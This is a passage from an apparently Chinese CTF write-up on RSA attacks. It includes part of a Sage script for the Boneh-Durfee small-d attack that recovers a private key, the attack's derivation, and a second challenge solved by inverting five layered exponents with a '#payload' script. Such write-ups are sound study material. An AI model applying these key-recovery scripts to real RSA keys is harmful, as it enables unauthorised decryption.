X <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>floor<span class="token punctuation">(</span>N<span class="token operator">^</span>delta<span class="token punctuation">)</span>  <span class="token comment"># this _might_ be too much</span></pre></td></tr><tr><td data-num="293"></td><td><pre>    Y <span class="token operator">=</span> floor<span class="token punctuation">(</span>N<span class="token operator">^</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># correct if p, q are ~ same size</span></pre></td></tr><tr><td data-num="294"></td><td><pre></pre></td></tr><tr><td data-num="295"></td><td><pre>    <span class="token comment">#</span></pre></td></tr><tr><td data-num="296"></td><td><pre>    <span class="token comment"># Don't touch anything below</span></pre></td></tr><tr><td data-num="297"></td><td><pre>    <span class="token comment">#</span></pre></td></tr><tr><td data-num="298"></td><td><pre></pre></td></tr><tr><td data-num="299"></td><td><pre>    <span class="token comment"># Problem put in equation</span></pre></td></tr><tr><td data-num="300"></td><td><pre>    P<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token punctuation">,</span>y<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="301"></td><td><pre>    A <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="302"></td><td><pre>    pol <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token punctuation">(</span>A <span class="token operator">+</span> y<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="303"></td><td><pre></pre></td></tr><tr><td data-num="304"></td><td><pre>    <span class="token comment">#</span></pre></td></tr><tr><td data-num="305"></td><td><pre>    <span class="token comment"># Find the solutions!</span></pre></td></tr><tr><td data-num="306"></td><td><pre>    <span class="token comment">#</span></pre></td></tr><tr><td data-num="307"></td><td><pre></pre></td></tr><tr><td data-num="308"></td><td><pre>    <span class="token comment"># Checking bounds</span></pre></td></tr><tr><td data-num="309"></td><td><pre>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="310"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=== checking values ==="</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="311"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"* delta:"</span><span class="token punctuation">,</span> delta<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="312"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"* delta &lt; 0.292"</span><span class="token punctuation">,</span> delta <span class="token operator">&lt;</span> <span class="token number">0.292</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="313"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"* size of e:"</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>log<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token operator">/</span>log<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="314"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"* size of N:"</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>log<span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token operator">/</span>log<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="315"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"* m:"</span><span class="token punctuation">,</span> m<span class="token punctuation">,</span> <span class="token string">", t:"</span><span class="token punctuation">,</span> t<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="316"></td><td><pre></pre></td></tr><tr><td data-num="317"></td><td><pre>    <span class="token comment"># boneh_durfee</span></pre></td></tr><tr><td data-num="318"></td><td><pre>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="319"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=== running algorithm ==="</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="320"></td><td><pre>        start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="321"></td><td><pre></pre></td></tr><tr><td data-num="322"></td><td><pre>    solx<span class="token punctuation">,</span> soly <span class="token operator">=</span> boneh_durfee<span class="token punctuation">(</span>pol<span class="token punctuation">,</span> e<span class="token punctuation">,</span> m<span class="token punctuation">,</span> t<span class="token punctuation">,</span> X<span class="token punctuation">,</span> Y<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="323"></td><td><pre></pre></td></tr><tr><td data-num="324"></td><td><pre>    <span class="token comment"># found a solution?</span></pre></td></tr><tr><td data-num="325"></td><td><pre>    <span class="token keyword">if</span> solx <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="326"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=== solution found ==="</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="327"></td><td><pre>        <span class="token keyword">if</span> <span class="token boolean">False</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="328"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"x:"</span><span class="token punctuation">,</span> solx<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="329"></td><td><pre>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"y:"</span><span class="token punctuation">,</span> soly<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="330"></td><td><pre></pre></td></tr><tr><td data-num="331"></td><td><pre>        d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>pol<span class="token punctuation">(</span>solx<span class="token punctuation">,</span> soly<span class="token punctuation">)</span> <span class="token operator">/</span> e<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="332"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"private key found:"</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="333"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="334"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=== no solution was found ==="</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="335"></td><td><pre></pre></td></tr><tr><td data-num="336"></td><td><pre>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="337"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"=== %s seconds ==="</span> <span class="token operator">%</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start_time<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="338"></td><td><pre></pre></td></tr><tr><td data-num="339"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="340"></td><td><pre>    example<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>通过 sage 跑出来 d 的值</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/03/9f2dd7c1bcdeae97.png" alt="" /></p>
<p>最后用生成的 d 去解开明文就好啦</p>
<p>这边说一下 Boneh_Durfee's Attack 的推导公式：</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>e</mi><mo>∗</mo><mi>d</mi><mo>=</mo><mn>1</mn><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi><mi>h</mi><mi>i</mi><mo stretchy="false">(</mo><mi>N</mi><mo stretchy="false">)</mo><mo>&lt;</mo><mo>=</mo><mo>=</mo><mo>=</mo><mo>=</mo><mo>&gt;</mo><mi>k</mi><mo>∗</mo><mi>p</mi><mi>h</mi><mi>i</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>+</mo><mn>1</mn><mo>=</mo><mn>0</mn><mi>m</mi><mi>o</mi><mi>d</mi><mi>e</mi><mspace linebreak="newline"></mspace><mtext>即</mtext><mn>2</mn><mi>k</mi><mrow><mo fence="true">(</mo><mfrac><mrow><mi>N</mi><mo>+</mo><mn>1</mn></mrow><mn>2</mn></mfrac><mo>+</mo><mfrac><mrow><mo>−</mo><mi>p</mi><mo>−</mo><mi>q</mi></mrow><mn>2</mn></mfrac><mo fence="true">)</mo></mrow><mo>+</mo><mn>1</mn><mo>=</mo><mn>0</mn><mi>m</mi><mi>o</mi><mi>d</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">e*d = 1 mod phi(N)  &lt;====&gt;  k * phi(n) + 1 = 0 mod e \\ 即2k \left( \frac{N+1}{2} + \frac{-p-q}{2} \right)+1=0mode
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="mord cjk_fallback">即</span><span class="mord">2</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.36033em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2603300000000002em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">e</span></span></span></span></span></p>
<p>换成二元一次方程就是</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><mo>+</mo><mi>x</mi><mo stretchy="false">(</mo><mi>A</mi><mo>+</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x,y)=1+x(A+y)
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span></span></p>
<p>通过这个通式可以解决未知 d 的问题；</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>e</mi><mi>d</mi><mo>=</mo><mn>1</mn><mo>+</mo><mi>x</mi><mo stretchy="false">(</mo><mfrac><mrow><mi>N</mi><mo>+</mo><mn>1</mn></mrow><mn>2</mn></mfrac><mo>+</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">ed=1+x(\frac{N+1}{2}+y)
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.04633em;vertical-align:-0.686em;"></span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.36033em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span></span></p>
<h2 id="一道蛮有意思的rsa"><a class="anchor" href="#一道蛮有意思的rsa">#</a> 一道蛮有意思的 RSA</h2>
<p>源码：</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span> long_to_bytes<span class="token punctuation">,</span> bytes_to_long<span class="token punctuation">,</span> inverse</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> math</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> gmpy2 <span class="token keyword">import</span> next_prime</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>FLAG <span class="token operator">=</span> <span class="token string">b"crypto&#123;????????????????????????????????????????????????&#125;"</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>N <span class="token operator">=</span> p<span class="token operator">*</span>q</pre></td></tr><tr><td data-num="10"></td><td><pre>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>e <span class="token operator">=</span> <span class="token number">0x10001</span></pre></td></tr><tr><td data-num="12"></td><td><pre>d <span class="token operator">=</span> inverse<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>my_key <span class="token operator">=</span> <span class="token punctuation">(</span>N<span class="token punctuation">,</span> d<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre>friends <span class="token operator">=</span> <span class="token number">5</span></pre></td></tr><tr><td data-num="17"></td><td><pre>friend_keys <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>N<span class="token punctuation">,</span> getPrime<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>friends<span class="token punctuation">)</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>cipher <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>FLAG<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token keyword">for</span> key <span class="token keyword">in</span> friend_keys<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    cipher <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>cipher<span class="token punctuation">,</span> key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"My private key: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>my_key<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"My Friend's public keys: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>friend_keys<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Encrypted flag: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>cipher<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>output:</p>
<figure class="highlight html"><figcaption data-lang="HTML"></figcaption><table><tr><td data-num="1"></td><td><pre>My private key: (21711308225346315542706844618441565741046498277716979943478360598053144971379956916575370343448988601905854572029635846626259487297950305231661109855854947494209135205589258643517961521594924368498672064293208230802441077390193682958095111922082677813175804775628884377724377647428385841831277059274172982280545237765559969228707506857561215268491024097063920337721783673060530181637161577401589126558556182546896783307370517275046522704047385786111489447064794210010802761708615907245523492585896286374996088089317826162798278528296206977900274431829829206103227171839270887476436899494428371323874689055690729986771, 2734411677251148030723138005716109733838866545375527602018255159319631026653190783670493107936401603981429171880504360560494771017246468702902647370954220312452541342858747590576273775107870450853533717116684326976263006435733382045807971890762018747729574021057430331778033982359184838159747331236538501849965329264774927607570410347019418407451937875684373454982306923178403161216817237890962651214718831954215200637651103907209347900857824722653217179548148145687181377220544864521808230122730967452981435355334932104265488075777638608041325256776275200067541533022527964743478554948792578057708522350812154888097)</pre></td></tr><tr><td data-num="2"></td><td><pre>My Friend's public keys: [(21711308225346315542706844618441565741046498277716979943478360598053144971379956916575370343448988601905854572029635846626259487297950305231661109855854947494209135205589258643517961521594924368498672064293208230802441077390193682958095111922082677813175804775628884377724377647428385841831277059274172982280545237765559969228707506857561215268491024097063920337721783673060530181637161577401589126558556182546896783307370517275046522704047385786111489447064794210010802761708615907245523492585896286374996088089317826162798278528296206977900274431829829206103227171839270887476436899494428371323874689055690729986771, 106979), (21711308225346315542706844618441565741046498277716979943478360598053144971379956916575370343448988601905854572029635846626259487297950305231661109855854947494209135205589258643517961521594924368498672064293208230802441077390193682958095111922082677813175804775628884377724377647428385841831277059274172982280545237765559969228707506857561215268491024097063920337721783673060530181637161577401589126558556182546896783307370517275046522704047385786111489447064794210010802761708615907245523492585896286374996088089317826162798278528296206977900274431829829206103227171839270887476436899494428371323874689055690729986771, 108533), (21711308225346315542706844618441565741046498277716979943478360598053144971379956916575370343448988601905854572029635846626259487297950305231661109855854947494209135205589258643517961521594924368498672064293208230802441077390193682958095111922082677813175804775628884377724377647428385841831277059274172982280545237765559969228707506857561215268491024097063920337721783673060530181637161577401589126558556182546896783307370517275046522704047385786111489447064794210010802761708615907245523492585896286374996088089317826162798278528296206977900274431829829206103227171839270887476436899494428371323874689055690729986771, 69557), (21711308225346315542706844618441565741046498277716979943478360598053144971379956916575370343448988601905854572029635846626259487297950305231661109855854947494209135205589258643517961521594924368498672064293208230802441077390193682958095111922082677813175804775628884377724377647428385841831277059274172982280545237765559969228707506857561215268491024097063920337721783673060530181637161577401589126558556182546896783307370517275046522704047385786111489447064794210010802761708615907245523492585896286374996088089317826162798278528296206977900274431829829206103227171839270887476436899494428371323874689055690729986771, 97117), (21711308225346315542706844618441565741046498277716979943478360598053144971379956916575370343448988601905854572029635846626259487297950305231661109855854947494209135205589258643517961521594924368498672064293208230802441077390193682958095111922082677813175804775628884377724377647428385841831277059274172982280545237765559969228707506857561215268491024097063920337721783673060530181637161577401589126558556182546896783307370517275046522704047385786111489447064794210010802761708615907245523492585896286374996088089317826162798278528296206977900274431829829206103227171839270887476436899494428371323874689055690729986771, 103231)]</pre></td></tr><tr><td data-num="3"></td><td><pre>Encrypted flag: 20304610279578186738172766224224793119885071262464464448863461184092225736054747976985179673905441502689126216282897704508745403799054734121583968853999791604281615154100736259131453424385364324630229671185343778172807262640709301838274824603101692485662726226902121105591137437331463201881264245562214012160875177167442010952439360623396658974413900469093836794752270399520074596329058725874834082188697377597949405779039139194196065364426213208345461407030771089787529200057105746584493554722790592530472869581310117300343461207750821737840042745530876391793484035024644475535353227851321505537398888106855012746117</pre></td></tr></table></figure><p>A 手中有一份（N,d）传给五个人不同的（N,e）</p>
<p>并且源码里这段是关键</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">for</span> key <span class="token keyword">in</span> friend_keys<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    cipher <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>cipher<span class="token punctuation">,</span> key<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> key<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>总之就是把明文先加密了五遍，那我们只要将它倒序解密五遍就好了。</p>
<p>key [1] 是 e，那么我们就换成 d 即可；</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> e<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    d<span class="token punctuation">.</span>append<span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>i<span class="token punctuation">,</span>phi<span class="token punctuation">)</span><span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span></pre></td></tr></table></figure><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#payload</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> gmpy2</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> getPrime<span class="token punctuation">,</span> long_to_bytes<span class="token punctuation">,</span> bytes_to_long<span class="token punctuation">,</span> inverse</pre></td></tr><tr><td data-num="4"></td><td><pre>n<span class="token operator">=</span><span class="token number">21711308225346315542706844618441565741046498277716979943478360598053144971379956916575370343448988601905854572029635846626259487297950305231661109855854947494209135205589258643517961521594924368498672064293208230802441077390193682958095111922082677813175804775628884377724377647428385841831277059274172982280545237765559969228707506857561215268491024097063920337721783673060530181637161577401589126558556182546896783307370517275046522704047385786111489447064794210010802761708615907245523492585896286374996088089317826162798278528296206977900274431829829206103227171839270887476436899494428371323874689055690729986771</span></pre></td></tr><tr><td data-num="5"></td><td><pre>c<span class="token operator">=</span><span 